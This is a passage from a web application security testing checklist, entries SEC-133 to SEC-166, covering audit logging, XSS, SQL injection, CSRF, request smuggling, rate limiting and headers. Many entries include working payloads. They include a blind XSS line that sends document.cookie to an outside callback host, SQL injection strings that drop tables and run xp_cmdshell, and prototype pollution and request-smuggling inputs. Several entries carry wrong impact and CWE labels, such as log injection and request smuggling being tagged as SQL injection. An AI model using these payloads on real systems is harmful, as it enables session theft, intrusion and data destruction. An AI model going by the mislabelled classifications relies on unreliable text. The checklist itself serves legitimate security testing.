**Impact:** Insufficient or injectable logging -&gt; forensic gaps / log injection / audit bypass.

**Tools:** Burp Suite;Manual Review

**References:** CWE-778; OWASP Logging &amp; Monitoring Failures (A09)

---

## SEC-133 — Audit Log Injection Prevention
**Test Category:** Injection (WSTG-INPV-15) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Security Audit Logs

**Test Steps:** 1. Perform actions with log injection payloads in parameters. 2. Include newline characters and fake log entries. 3. Include ANSI escape sequences. 4. Test for log forging. 5. Verify log sanitization.

**Expected Result:** Application must sanitize all data written to audit logs to prevent log injection and log forging attacks.

**Payload Example:**

```
username=admin%0a[SUCCESS] Admin login from 1.2.3.4%0a;action=test\n[2025-01-01] FAKE ADMIN ACTION;include ANSI codes
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SEC-134 — Audit Log Access Control
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Security Audit Logs

**Test Steps:** 1. Attempt to access audit logs as a regular user. 2. Check if log viewing is restricted to admin roles. 3. Test for IDOR on individual log entries. 4. Verify role-based log access.

**Expected Result:** Audit logs must be accessible only to authorized security and admin roles with proper access controls on all log endpoints.

**Payload Example:**

```
GET /api/audit-logs with regular user token;GET /api/admin/audit-logs;GET /api/audit-logs?user_id=1002
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SEC-135 — Sensitive Data in Audit Logs
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Security Audit Logs

**Test Steps:** 1. Trigger logging of sensitive operations. 2. Review log entries for plaintext passwords or tokens or credit card numbers. 3. Check if PII is masked in logs. 4. Verify log data classification.

**Expected Result:** Audit logs must not contain sensitive data like plaintext passwords or full credit card numbers and must mask PII appropriately.

**Payload Example:**

```
Check logs for password=plaintext;session_token=full_value;credit_card=full_number;ssn=unmasked after performing auth operations
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Manual Review;Log Analysis Tools

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## SEC-136 — Audit Log Denial of Service
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Security Audit Logs

**Test Steps:** 1. Generate a massive volume of log-worthy events rapidly. 2. Check if logging infrastructure handles high volume. 3. Test if log DoS affects application performance. 4. Verify log rotation and retention.

**Expected Result:** Audit log infrastructure must handle high volumes without affecting application performance and implement proper rotation and retention.

**Payload Example:**

```
Generate 10000+ logged events per minute;check for log storage exhaustion;verify log rotation;check application performance
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite Intruder;JMeter;Custom Scripts

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## SEC-137 — Audit Log Timestamp Integrity
**Test Category:** Logging (WSTG-CONF-09) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Security Audit Logs

**Test Steps:** 1. Check log timestamps for accuracy. 2. Verify timestamps use UTC. 3. Check for NTP synchronization. 4. Test if client-provided timestamps can influence log entries. 5. Verify monotonic ordering.

**Expected Result:** Audit log timestamps must be generated server-side using synchronized UTC time and not be influenceable by client-provided values.

**Payload Example:**

```
Compare log timestamps with actual time;check for timezone consistency;verify NTP sync;try modifying client time headers
```

**Impact:** Insufficient or injectable logging -&gt; forensic gaps / log injection / audit bypass.

**Tools:** Manual Review;NTP Tools

**References:** CWE-778; OWASP Logging &amp; Monitoring Failures (A09)

---

## SEC-138 — Audit Log Retention and Archival
**Test Category:** Compliance (WSTG-CONF-09) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Security Audit Logs

**Test Steps:** 1. Check audit log retention policy. 2. Verify logs are retained for required compliance period. 3. Check if archived logs are encrypted. 4. Verify archived logs are accessible for investigation. 5. Test log search and retrieval.

**Expected Result:** Audit logs must be retained for the required compliance period with encrypted archival and searchable retrieval capability.

**Payload Example:**

```
Verify 1-7 year retention based on compliance;check encrypted archive storage;test log search for historical events
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Manual Review;Log Management Tools

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## SEC-139 — Failed Authentication Logging Verification
**Test Category:** Logging (WSTG-CONF-09) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Security Audit Logs

**Test Steps:** 1. Attempt multiple failed logins. 2. Verify each failed attempt is logged. 3. Check if username and IP and timestamp are captured. 4. Verify lockout events are logged. 5. Check for rate limiting notification logs.

**Expected Result:** All failed authentication attempts must be logged with sufficient detail to detect and investigate brute force attacks.

**Payload Example:**

```
Perform 10 failed logins and verify each appears in logs with username_attempted;source_ip;timestamp;failure_reason
```

**Impact:** Insufficient or injectable logging -&gt; forensic gaps / log injection / audit bypass.

**Tools:** Manual Review;Burp Suite

**References:** CWE-778; OWASP Logging &amp; Monitoring Failures (A09)

---

## SEC-140 — Privilege Change Audit Logging
**Test Category:** Logging (WSTG-CONF-09) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Security Audit Logs

**Test Steps:** 1. Change user roles and permissions. 2. Verify privilege escalation events are logged. 3. Check if the changed-by user is recorded. 4. Verify before and after values are captured. 5. Test for admin impersonation logging.

**Expected Result:** All privilege and role changes must be logged with the initiating user and before/after values for accountability.

**Payload Example:**

```
Change user role from regular to admin;verify log entry captures who_changed;old_role;new_role;timestamp;justification
```

**Impact:** Insufficient or injectable logging -&gt; forensic gaps / log injection / audit bypass.

**Tools:** Manual Review;Burp Suite

**References:** CWE-778; OWASP Logging &amp; Monitoring Failures (A09)

---

## SEC-141 — CSRF via Flash or Silverlight Cross-Domain Policy
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** CSRF Protection

**Test Steps:** 1. Check for crossdomain.xml file. 2. Check for clientaccesspolicy.xml. 3. Verify if overly permissive cross-domain policies exist. 4. Test if Flash can make authenticated cross-domain requests.

**Expected Result:** Application must have restrictive cross-domain policies or no crossdomain.xml file to prevent Flash/Silverlight-based CSRF.

**Payload Example:**

```
Check /crossdomain.xml for allow-access-from domain="*";check /clientaccesspolicy.xml for permissive policies
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Browser;cURL

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## SEC-142 — Blind XSS Detection
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** Critical · **CVSS:** 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** XSS Prevention

**Test Steps:** 1. Inject blind XSS payloads in all user input fields. 2. Use XSS Hunter or similar callback service. 3. Target fields viewed by admin or support staff. 4. Include payloads in HTTP headers like User-Agent. 5. Wait for callback confirmation.

**Expected Result:** Application must sanitize all stored data regardless of where it is rendered to prevent blind XSS attacks targeting admin or internal panels.

**Payload Example:**

```
><script src=https://xsshunter.xss.ht></script>;><img src=x onerror=fetch('https://callback.xss.ht/'+document.cookie)>;inject in User-Agent and Referer
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** XSS Hunter;Burp Suite;Custom Callback Server

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SEC-143 — SQL Injection via Stored Procedures
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** SQL Injection Prevention

**Test Steps:** 1. Identify endpoints that invoke stored procedures. 2. Test for SQL injection in stored procedure parameters. 3. Check for dynamic SQL within stored procedures. 4. Test with stacked queries.

**Expected Result:** Application must use parameterized calls to stored procedures and avoid dynamic SQL within procedures.

**Payload Example:**

```
exec sp_name 'param1'; DROP TABLE users--;EXEC xp_cmdshell 'dir';'; EXEC sp_msforeachtable 'DROP TABLE ?'--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SEC-144 — Prototype Pollution Testing
**Test Category:** Injection (WSTG-INPV-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Input Sanitization

**Test Steps:** 1. Identify Node.js or JavaScript-based backend. 2. Test for prototype pollution via JSON body. 3. Inject __proto__ and constructor.prototype payloads. 4. Check for privilege escalation or RCE via prototype pollution.

**Expected Result:** Application must sanitize incoming JSON objects and reject prototype pollution payloads to prevent object manipulation.

**Payload Example:**

```
{"__proto__":{"isAdmin":true}};{"constructor":{"prototype":{"isAdmin":true}}};{"__proto__":{"shell":"node"}}
```

**Impact:** Prototype pollution -&gt; DOM XSS (client) / RCE (server).

**Tools:** Burp Suite;Custom Scripts;server-side-prototype-pollution

**References:** CWE-1321; -&gt;[Prototype Pollution checklist](#/checklist/prototype); Olivier Arteau; PortSwigger server-side PP

---

## SEC-145 — Rate Limit Header Manipulation for Reset
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Rate Limiting

**Test Steps:** 1. Identify rate limit tracking mechanism. 2. Attempt to reset rate limit counters via header manipulation. 3. Modify session identifier to get fresh rate limit. 4. Test with cookie manipulation.

**Expected Result:** Application must implement rate limiting that cannot be reset through client-side header or cookie manipulation.

**Payload Example:**

```
Modify session cookie to get new rate limit;add X-Rate-Limit-Reset: 0 header;delete rate limit tracking cookies
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## SEC-146 — CAPTCHA Integration Security Assessment
**Test Category:** Authentication (WSTG-ATHN-08) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Captcha / reCAPTCHA

**Test Steps:** 1. Verify CAPTCHA is validated before processing the form. 2. Check if form can be processed while CAPTCHA validation is pending. 3. Test for race condition between CAPTCHA validation and form processing.

**Expected Result:** Application must validate CAPTCHA synchronously before processing any form data and not allow race condition bypass.

**Payload Example:**

```
Submit form and CAPTCHA validation concurrently;cancel CAPTCHA request after form submission;test timing window
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite;Turbo Intruder

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## SEC-147 — IP Reputation Check Bypass
**Test Category:** Security Misconfiguration (WSTG-CONF-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** IP Blocking

**Test Steps:** 1. Check if the application uses IP reputation lists. 2. Test access from known malicious IPs. 3. Test from TOR exit nodes. 4. Test from cloud provider IPs. 5. Verify reputation database freshness.

**Expected Result:** Application must use updated IP reputation databases and block known malicious IP ranges while handling cloud and VPN IPs appropriately.

**Payload Example:**

```
Access from TOR exit node;use known botnet IP ranges;test from cloud provider IPs;check reputation database update frequency
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** TOR;VPN;Cloud Infrastructure;Nmap

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## SEC-148 — Device Fingerprint Spoofing
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Fraud Detection

**Test Steps:** 1. Identify device fingerprinting mechanisms. 2. Modify browser fingerprint components. 3. Use anti-fingerprint browser extensions. 4. Change canvas and WebGL fingerprints. 5. Spoof navigator properties.

**Expected Result:** Application must implement resilient device fingerprinting that cannot be easily spoofed by standard browser manipulation techniques.

**Payload Example:**

```
Modify navigator.userAgent;spoof canvas fingerprint;change screen resolution;modify WebGL renderer;use antidetect browser
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Browser DevTools;Canvas Fingerprint Spoofer;FingerprintJS

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## SEC-149 — Cross-Origin-Opener-Policy (COOP) Check
**Test Category:** Security Misconfiguration (WSTG-CONF-07) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Security Headers

**Test Steps:** 1. Check for Cross-Origin-Opener-Policy header. 2. Verify value is same-origin for sensitive pages. 3. Test cross-origin window reference access. 4. Verify protection against Spectre-like attacks.

**Expected Result:** Application must set Cross-Origin-Opener-Policy: same-origin on sensitive pages to isolate browsing contexts and mitigate cross-origin attacks.

**Payload Example:**

```
Check for Cross-Origin-Opener-Policy header;test window.opener access from cross-origin pages;verify browsing context isolation
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite;Browser DevTools

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## SEC-150 — Cross-Origin-Embedder-Policy (COEP) Check
**Test Category:** Security Misconfiguration (WSTG-CONF-07) · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Security Headers

**Test Steps:** 1. Check for Cross-Origin-Embedder-Policy header. 2. Verify value is require-corp or credentialless. 3. Test cross-origin resource embedding behavior. 4. Verify SharedArrayBuffer availability requires COEP.

**Expected Result:** Application must set Cross-Origin-Embedder-Policy where needed to enable cross-origin isolation for features like SharedArrayBuffer.

**Payload Example:**

```
Check for Cross-Origin-Embedder-Policy: require-corp;verify cross-origin resource embedding restrictions
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite;Browser DevTools

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## SEC-151 — CSP Strict-Dynamic Evaluation
**Test Category:** Security Misconfiguration (WSTG-CONF-07) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Content Security Policy

**Test Steps:** 1. Check if CSP uses strict-dynamic. 2. Verify nonce propagation to dynamically created scripts. 3. Test if strict-dynamic bypasses are possible. 4. Check for script gadgets in whitelisted libraries.

**Expected Result:** CSP strict-dynamic must be properly implemented ensuring only nonced scripts can propagate trust to dynamically loaded scripts.

**Payload Example:**

```
Check for script-src 'strict-dynamic' 'nonce-xxx';test if document.createElement('script') gets trust;look for gadget chains
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite;CSP Evaluator;Browser DevTools

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## SEC-152 — API Response Encryption Assessment
**Test Category:** Cryptography (WSTG-CRYP-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Encryption (At Rest / In Transit)

**Test Steps:** 1. Check if sensitive API responses contain encrypted payloads. 2. Verify field-level encryption for sensitive data. 3. Check for encrypted JWT payloads (JWE). 4. Test for data exposure in unencrypted responses.

**Expected Result:** Sensitive data in API responses must be encrypted at the field level when containing PII or financial data beyond transport-level TLS encryption.

**Payload Example:**

```
Check API responses for unencrypted ssn;credit_card;health_data fields;verify JWE for sensitive JWTs;test field-level encryption
```

**Impact:** Weak/broken cryptography -&gt; data exposure, token forgery, integrity bypass.

**Tools:** Burp Suite;Postman

**References:** CWE-327; OWASP Cryptographic Failures (A02); WSTG-CRYP

---

## SEC-153 — Secret Scanning in Repositories
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Vulnerability Scanning

**Test Steps:** 1. Scan code repositories for hardcoded secrets. 2. Check for API keys and passwords and tokens in source. 3. Scan git history for previously committed secrets. 4. Check environment files for sensitive data.

**Expected Result:** No secrets including API keys and passwords and tokens must be present in source code repositories or their history.

**Payload Example:**

```
Run GitLeaks;TruffleHog;git-secrets on repository;check .env files;scan git log for secret patterns
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** GitLeaks;TruffleHog;git-secrets;GitHub Secret Scanning

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## SEC-154 — Subdomain Enumeration and Takeover Testing
**Test Category:** Security Misconfiguration (WSTG-CONF-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Penetration Testing

**Test Steps:** 1. Enumerate all subdomains of the target. 2. Check for dangling DNS records. 3. Test for subdomain takeover on unclaimed services. 4. Verify SSL certificates cover all active subdomains.

**Expected Result:** All subdomains must be properly maintained with no dangling DNS records that could allow subdomain takeover attacks.

**Payload Example:**

```
Run subfinder;amass;sublist3r;check for CNAME to unclaimed services;test S3;Heroku;Azure;GitHub Pages takeover
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** subfinder;amass;subjack;nuclei;Can-I-Take-Over-XYZ

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## SEC-155 — Cross-Origin Audit Log Correlation
**Test Category:** Logging (WSTG-CONF-09) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Security Audit Logs

**Test Steps:** 1. Verify logs contain correlation IDs across services. 2. Check if distributed tracing is implemented. 3. Test log correlation during multi-step attacks. 4. Verify attack chain reconstruction capability.

**Expected Result:** Audit logs must support cross-service correlation through unique request IDs enabling attack chain reconstruction across distributed systems.

**Payload Example:**

```
Check for X-Request-ID or X-Correlation-ID in logs;verify same ID across API gateway;app server;database logs
```

**Impact:** Insufficient or injectable logging -&gt; forensic gaps / log injection / audit bypass.

**Tools:** Manual Review;ELK Stack;Splunk

**References:** CWE-778; OWASP Logging &amp; Monitoring Failures (A09)

---

## SEC-156 — CSRF on JSON API Endpoints
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** CSRF Protection

**Test Steps:** 1. Identify JSON API endpoints that perform state changes. 2. Check if CSRF protection exists for JSON content type. 3. Test if changing to form content type bypasses CSRF. 4. Test with fetch API from cross-origin.

**Expected Result:** Application must implement CSRF protection for all state-changing API endpoints regardless of content type including JSON APIs.

**Payload Example:**

```
Create cross-origin page with fetch('https://target.com/api/action',{method:'POST',credentials:'include',headers:{'Content-Type':'text/plain'},body:JSON.stringify({data:'test'})})
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## SEC-157 — XSS via CSS Injection
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** XSS Prevention

**Test Steps:** 1. Identify fields where user input affects CSS. 2. Inject CSS expressions and url() with JavaScript. 3. Test for CSS-based data exfiltration. 4. Check style attribute injection. 5. Test for behavior property injection.

**Expected Result:** Application must sanitize user input used in CSS contexts and restrict CSS injection vectors.

**Payload Example:**

```
style=background:url(javascript:alert(1));expression(alert(1));-moz-binding:url(evil.xml#xss);content:attr(data-secret)
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;Browser DevTools

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SEC-158 — HTTP Request Smuggling Testing
**Test Category:** Injection (WSTG-INPV-17) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Input Sanitization

**Test Steps:** 1. Test for CL.TE request smuggling. 2. Test for TE.CL smuggling. 3. Test for TE.TE with header obfuscation. 4. Test for HTTP/2 downgrade smuggling. 5. Verify front-end and back-end agreement on request boundaries.

**Expected Result:** Application and its infrastructure must handle Content-Length and Transfer-Encoding headers consistently to prevent request smuggling.

**Payload Example:**

```
CL.TE: Content-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED;TE.CL with obfuscated TE header
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite HTTP Request Smuggler;Custom Scripts

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SEC-159 — Rate Limiting on OTP Verification
**Test Category:** Authentication (WSTG-ATHN-03) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Rate Limiting

**Test Steps:** 1. Request an OTP. 2. Attempt to brute force the OTP with rapid submissions. 3. Check if rate limiting or lockout occurs after failed attempts. 4. Verify OTP length provides sufficient entropy against brute force.

**Expected Result:** Application must rate limit OTP verification attempts to 3-5 tries and lock out the OTP after exceeded attempts requiring a new OTP.

**Payload Example:**

```
Send 100+ POST /api/verify-otp with sequential 4-digit codes 0000-9999;check for lockout;verify OTP expiry after failures
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite Intruder;Custom Scripts

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## SEC-160 — Velocity Check Bypass Testing
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Fraud Detection

**Test Steps:** 1. Identify velocity-based fraud checks on transactions. 2. Test with transactions spaced just outside velocity windows. 3. Split transactions across multiple accounts. 4. Test with different payment methods.

**Expected Result:** Application must implement velocity checks that consider cross-account and cross-method patterns and not rely solely on single-dimension velocity.

**Payload Example:**

```
Send transactions just under velocity thresholds;split across accounts;alternate payment methods;test timing boundaries
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-840; PortSwigger Business logic

---

## SEC-161 — Audit Log Export Security
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Security Audit Logs

**Test Steps:** 1. Check if audit log export is available. 2. Verify authorization on export endpoint. 3. Check for IDOR on log export. 4. Verify exported logs are encrypted. 5. Check for excessive data in exports.

**Expected Result:** Audit log export must require proper authorization and encrypt exported data and not expose logs through IDOR vulnerabilities.

**Payload Example:**

```
GET /api/audit-logs/export with regular user;GET /api/admin/audit-logs/export?user_id=all;check export encryption
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SEC-162 — HTTPS Enforcement on API Endpoints
**Test Category:** Transport Security (WSTG-CONF-07) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** HTTPS Enforcement

**Test Steps:** 1. Access all API endpoints over HTTP. 2. Verify redirection to HTTPS. 3. Check if API data is served over HTTP even momentarily. 4. Verify API authentication tokens are not sent over HTTP.

**Expected Result:** All API endpoints must enforce HTTPS and never serve data or accept authentication tokens over plain HTTP connections.

**Payload Example:**

```
curl http://api.target.com/v1/users;curl http://target.com/api/data;verify no data returned before HTTPS redirect
```

**Impact:** Credentials/tokens over cleartext -&gt; network interception -&gt; account takeover.

**Tools:** cURL;Burp Suite;Wireshark

**References:** CWE-319; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-01

---

## SEC-163 — CSP frame-ancestors vs X-Frame-Options Conflict
**Test Category:** Security Misconfiguration (WSTG-CONF-07) · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Content Security Policy

**Test Steps:** 1. Check if both CSP frame-ancestors and X-Frame-Options are set. 2. Verify they have consistent values. 3. Check which takes precedence in different browsers. 4. Test for bypass through inconsistency.

**Expected Result:** Application must use consistent framing restrictions through CSP frame-ancestors (which takes precedence) and X-Frame-Options as fallback.

**Payload Example:**

```
Check for CSP frame-ancestors 'none' with X-Frame-Options: SAMEORIGIN conflict;verify browser behavior with both present
```

**Impact:** Clickjacking of a sensitive action -&gt; UI-redress-driven state change.

**Tools:** Burp Suite;SecurityHeaders.com;Multiple Browsers

**References:** CWE-1021; -&gt;[CSRF checklist](#/checklist/csrf); OWASP Clickjacking; PortSwigger

---

## SEC-164 — Initialization Vector (IV) Reuse Detection
**Test Category:** Cryptography (WSTG-CRYP-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Encryption (At Rest / In Transit)

**Test Steps:** 1. Identify encryption implementations in the application. 2. Check for IV generation patterns. 3. Encrypt the same plaintext multiple times and compare ciphertexts. 4. Verify IV uniqueness per encryption operation.

**Expected Result:** Application must generate unique random IVs for every encryption operation and never reuse IVs with the same key.

**Payload Example:**

```
Encrypt same data multiple times and check if ciphertext changes;analyze IV patterns for predictability;check for static IVs
```

**Impact:** Weak/broken cryptography -&gt; data exposure, token forgery, integrity bypass.

**Tools:** Custom Scripts;CryptoAnalysis Tools

**References:** CWE-327; OWASP Cryptographic Failures (A02); WSTG-CRYP

---

## SEC-165 — Subdomain and Asset Discovery
**Test Category:** Reconnaissance (WSTG-INFO-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Vulnerability Scanning

**Test Steps:** 1. Enumerate all subdomains and related assets. 2. Scan for development and staging environments. 3. Check for exposed internal tools. 4. Identify forgotten or legacy applications.

**Expected Result:** All internet-facing assets must be inventoried and maintained with no forgotten or unpatched development and staging environments exposed.

**Payload Example:**

```
Run subfinder;amass;shodan for asset discovery;check for dev.target.com;staging.target.com;admin.target.com
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** subfinder;amass;Shodan;Censys;httpx

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## SEC-166 — Error Handling and Information Leakage
